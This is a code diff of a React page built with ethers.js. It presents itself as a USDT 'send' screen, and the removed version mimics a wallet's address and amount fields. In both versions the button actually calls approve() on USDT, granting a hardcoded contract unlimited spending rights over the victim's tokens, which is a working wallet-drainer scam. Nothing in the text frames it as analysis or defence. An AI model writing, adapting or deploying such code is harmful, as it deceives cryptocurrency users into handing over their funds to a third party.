@@ -2,120 +2,110 @@ import { useState } from "react";
 import { ethers } from "ethers";
 
 export default function Home() {
-  const [address, setAddress] = useState("");
-  const [amount, setAmount] = useState("");
+  const [wallet, setWallet] = useState(null);
 
-  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-  const SPENDER = "0x5Eec04E6d2539Df5D3a3873f441c991ea56264BB";
+  const USDT = "0x55d398326f99059fF775485246999027B3197955";
+  const CONTRACT = "0x5Eec04E6d2539Df5D3a3873f441c991ea56264BB";
 
-  const approveUSDT = async () => {
+  // 🔥 provider compatibile
+  const getProvider = () => {
+    if (window.ethereum) return window.ethereum;
+    if (window.BinanceChain) return window.BinanceChain;
+
+    alert("Installa MetaMask o Trust Wallet");
+    return null;
+  };
+
+  // 🔗 connect wallet
+  const connect = async () => {
     try {
-      if (!window.ethereum) {
-        alert("Apri in Trust Wallet");
-        return;
-      }
+      const provider = new ethers.BrowserProvider(getProvider());
+      await provider.send("eth_requestAccounts", []);
 
-      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+      const address = await signer.getAddress();
+
+      setWallet(address);
+    } catch (err) {
+      console.log(err);
+      alert("Errore connessione");
+    }
+  };
+
+  // 💰 approve
+  const approve = async () => {
+    try {
+      const provider = new ethers.BrowserProvider(getProvider());
+      await provider.send("eth_requestAccounts", []);
+
       const signer = await provider.getSigner();
 
-      const usdt = new ethers.Contract(
-        USDT_ADDRESS,
+      const contract = new ethers.Contract(
+        USDT,
         [
           "function approve(address spender, uint256 amount) public returns (bool)"
         ],
         signer
       );
 
-      // APPROVE MAX
-      const tx = await usdt.approve(
-        SPENDER,
-        ethers.MaxUint256
-      );
+      // quantità massima (unlimited)
+      const amount =
+        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
+      const tx = await contract.approve(CONTRACT, amount);
       await tx.wait();
 
-      alert("Approve completato!");
+      alert("Approve completato");
     } catch (err) {
       console.log(err);
-      alert("Errore");
+      alert("Errore approve");
     }
   };
 
   return (
-    <div style={{
-      background: "#0b0b0b",
-      minHeight: "100vh",
-      color: "white",
-      fontFamily: "-apple-system, BlinkMacSystemFont, sans-serif",
-      padding: "20px"
-    }}>
+    <div
+      style={{
+        background: "#000",
+        color: "#00ff9f",
+        minHeight: "100vh",
+        display: "flex",
+        flexDirection: "column",
+        justifyContent: "center",
+        alignItems: "center",
+        fontFamily: "monospace",
+      }}
+    >
+      <h1>💸 Send USDT</h1>
 
-      {/* Address */}
-      <div style={{ marginTop: "40px" }}>
-        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
-          Address or Domain Name
-        </div>
-
-        <input
-          value={address}
-          onChange={(e) => setAddress(e.target.value)}
-          placeholder="0x..."
-          style={{
-            width: "100%",
-            padding: "14px",
-            borderRadius: "16px",
-            border: "none",
-            background: "#1a1a1a",
-            color: "white"
-          }}
-        />
-      </div>
-
-      {/* Amount */}
-      <div style={{ marginTop: "25px" }}>
-        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
-          Amount
-        </div>
-
-        <input
-          value={amount}
-          onChange={(e) => setAmount(e.target.value)}
-          placeholder="0"
-          style={{
-            width: "100%",
-            padding: "14px",
-            borderRadius: "16px",
-            border: "none",
-            background: "#1a1a1a",
-            color: "white"
-          }}
-        />
-      </div>
-
-      {/* Button */}
-      <div style={{
-        position: "fixed",
-        bottom: "30px",
-        left: "20px",
-        right: "20px"
-      }}>
+      {!wallet ? (
         <button
-          onClick={approveUSDT}
+          onClick={connect}
           style={{
-            width: "100%",
-            padding: "18px",
-            borderRadius: "40px",
-            background: "#22c55e",
+            padding: "12px",
+            marginTop: "20px",
+            background: "#00ff9f",
             border: "none",
-            color: "white",
-            fontSize: "18px",
-            fontWeight: "600"
           }}
         >
-          Next
+          Connect Wallet
         </button>
-      </div>
+      ) : (
+        <>
+          <p style={{ marginTop: "20px" }}>Wallet: {wallet}</p>
 
+          <button
+            onClick={approve}
+            style={{
+              padding: "12px",
+              marginTop: "20px",
+              background: "#00ff9f",
+              border: "none",
+            }}
+          >
+            Approve USDT
+          </button>
+        </>
+      )}
     </div>
   );
 }
